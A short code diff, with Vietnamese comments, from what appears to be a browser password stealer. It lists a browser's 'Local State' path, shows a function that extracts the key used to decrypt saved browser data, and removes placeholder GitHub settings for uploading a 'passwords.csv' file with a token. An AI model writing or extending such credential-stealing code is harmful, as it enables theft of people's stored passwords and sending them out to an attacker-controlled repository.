@@ -23,11 +23,6 @@ LOCAL_STATE_PATHS = {
     "CocCoc": os.path.expanduser("~") + r"\AppData\Local\CocCoc\Browser\User Data\Local State"
 }
 
-# Các biến cấu hình GitHub (hãy thay đổi theo cấu hình của bạn)
-GITHUB_USERNAME = "your_username"
-GITHUB_REPO = "your_repo"
-GITHUB_FILE_PATH = "passwords.csv"
-GITHUB_TOKEN = "your_github_token"
 
 def get_encryption_key(local_state_path):
     """Lấy key giải mã từ file Local State"""
